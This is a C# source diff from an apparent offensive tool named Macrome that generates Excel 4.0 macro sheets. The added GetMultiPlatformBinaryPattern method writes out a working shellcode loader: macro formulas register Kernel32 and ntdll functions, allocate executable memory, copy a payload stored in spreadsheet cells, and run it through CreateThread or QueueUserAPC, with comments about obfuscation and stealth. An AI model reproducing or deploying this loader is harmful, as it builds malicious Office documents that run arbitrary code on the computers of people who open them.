@@ -10,6 +10,7 @@ namespace Macrome
     public static class MacroPatterns
     {
         public const string MacroColumnSeparator = ";;;;;";
+        public const string DefaultVariableName = "šœƒ";
 
         private static int GetColNumberFromExcelA1ColName(string colName)
         {
@@ -82,7 +83,7 @@ namespace Macrome
         /// <param name="cellFormula"></param>
         /// <param name="variableName"></param>
         /// <returns></returns>
-        public static string ReplaceSelectActiveCellFormula(string cellFormula, string variableName = "šœƒ")
+        public static string ReplaceSelectActiveCellFormula(string cellFormula, string variableName = DefaultVariableName)
         {
             if (cellFormula.Contains("ACTIVE.CELL()"))
             {
@@ -275,7 +276,7 @@ namespace Macrome
             return importedMacros;
         }
 
-        public static List<String> GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
+        public static List<String> GetX86GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
         {
             int offset;
             if (preamble.Count == 0)
@@ -290,13 +291,13 @@ namespace Macrome
             //Col 1 is our obfuscated payload
             //Col 2 is our actual macro set defined below
             //Col 3 is a separated set of cells containing a binary payload, ends with the string END
-            string lengthCounter = String.Format("R{0}C4", offset);
-            string offsetCounter = String.Format("R{0}C4", offset + 1);
-            string dataCellRef = String.Format("R{0}C4", offset + 2);
-            string dataCol = "C3";
+            string lengthCounter = String.Format("R{0}C40", offset);
+            string offsetCounter = String.Format("R{0}C40", offset + 1);
+            string dataCellRef = String.Format("R{0}C40", offset + 2);
+            string dataCol = "C2";
 
             //Expects our invocation of VirtualAlloc to be on row 5, but this will change if the macro changes
-            string baseMemoryAddress = String.Format("R{0}C2", preamble.Count + 4); //for some reason this only works when its count, not offset
+            string baseMemoryAddress = String.Format("R{0}C1", preamble.Count + 4); //for some reason this only works when its count, not offset
 
             //TODO [Stealth] Add VirtualProtect so we don't call VirtualAlloc with RWX permissions
             //TODO [Functionality] Apply x64 support changes from https://github.com/outflanknl/Scripts/blob/master/ShellcodeToJScript.js
@@ -329,9 +330,75 @@ namespace Macrome
             return macros;
         }
 
-        public static List<String> GetBinaryLoader64bitPattern(string macroSheetName)
+        public static List<String> GetMultiPlatformBinaryPattern(List<string> preamble, string macroSheetName)
         {
-            throw new NotImplementedException();
+            int offset;
+            if (preamble.Count == 0)
+            {
+                offset = 1;
+            }
+            else
+            {
+                offset = preamble.Count;
+            }
+
+
+            //These variables assume certain positions in generated macros
+            //Col 1 is our main logic
+            //Col 2 is our x86 payload, terminated by END
+            //Col 3 is our x64 payload, terminated by END
+            string x86CellStart = string.Format("R{0}C1", offset + 4);     //A5
+            string x64CellStart = string.Format("R{0}C1", offset + 15);    //A16
+            string variableName = DefaultVariableName; 
+            string x86PayloadCellStart = "R1C2";  //B1
+            string x64PayloadCellStart = "R1C2";  //C1
+            string rowsWrittenCell = "R1C4";      //D1
+            string lengthOfCurrentCell = "R2C4";  //D2
+            //Happens to be the same cell right now
+            string x86AllocatedMemoryBase = x86CellStart;
+            string x64AllocatedMemoryBase = string.Format("R{0}C1", offset + 16); //A17
+
+            List<string> macros = new List<string>()
+            {
+                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"Valloc\",,1,9)",
+                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WProcessMemory\",,1,9)",
+                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CThread\",,1,9)",
+                string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),GOTO({0}),GOTO({1}))",x86CellStart, x64CellStart),
+                "=Valloc(0,65536,4096,64)",
+                string.Format("{0}={1}", variableName, x86PayloadCellStart),
+                string.Format("=SET.VALUE({0},0)", rowsWrittenCell),
+                string.Format("=WHILE({0}<>\"END\")", variableName),
+                string.Format("=SET.VALUE({0},LEN({1}))", lengthOfCurrentCell, variableName),
+                string.Format("=WProcessMemory(-1,{0}+({1}*255),{2},LEN({2}),0)", x86AllocatedMemoryBase, rowsWrittenCell, variableName),
+                string.Format("=SET.VALUE({0},{0}+1)", rowsWrittenCell),
+                string.Format("{0}=ABSREF(\"R[1]C\",{0})",variableName),
+                "=NEXT()",
+                string.Format("=CThread(0,0,{0},0,0,0)", x86AllocatedMemoryBase),
+                "=HALT()",
+                "1342439424", //Base memory address to brute force a page
+                "0",
+                string.Format("=WHILE({0}=0)", x64AllocatedMemoryBase),
+                string.Format("=SET.VALUE({0},Valloc({1},65536,12288,64))", x64AllocatedMemoryBase, x64CellStart),
+                string.Format("=SET.VALUE({0},{0}+262144)", x64CellStart),
+                "=NEXT()",
+                "=REGISTER(\"Kernel32\",\"RtlCopyMemory\",\"JJCJ\",\"RTL\",,1,9)",
+                "=REGISTER(\"Kernel32\",\"QueueUserAPC\",\"JJJJ\",\"Queue\",,1,9)",
+                "=REGISTER(\"ntdll\",\"NtTestAlert\",\"J\",\"Go\",,1,9)",
+                string.Format("{0}={1}", variableName, x64PayloadCellStart),
+                string.Format("=SET.VALUE({0},0)", rowsWrittenCell),
+                string.Format("=WHILE({0}<>\"END\")", variableName),
+                string.Format("=SET.VALUE({0},LEN({1}))", lengthOfCurrentCell, variableName),
+                string.Format("=RTL({0}+({1}*10),{2},LEN({2}))", x64AllocatedMemoryBase, rowsWrittenCell, variableName),
+                string.Format("=SET.VALUE({0},{0}+1)",rowsWrittenCell),
+                string.Format("{0}=ABSREF(\"R[1]C\",{0})", variableName),
+                "=NEXT()",
+                string.Format("=Queue({0},-2,0)", x64AllocatedMemoryBase),
+                "=Go()",
+                string.Format("=SET.VALUE({0},0)",x64AllocatedMemoryBase),
+                "=HALT()"
+            };
+
+            return macros;
         }
     }
 }
